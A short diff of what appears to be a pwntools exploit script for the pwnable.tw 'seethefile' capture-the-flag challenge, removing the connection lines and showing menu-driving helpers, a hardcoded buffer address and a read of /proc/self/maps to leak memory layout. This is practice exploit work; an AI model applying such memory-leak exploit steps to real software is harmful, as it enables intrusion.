@@ -15,8 +15,6 @@ def exit(name):
         r.sendlineafter("choice :", "5")
         r.sendlineafter("name :", name)
 
-#r = remote("chall.pwnable.tw", 10200)
-r = process("./seethefile")
 name = 0x0804B260
 
 openfile("/proc/self/maps")
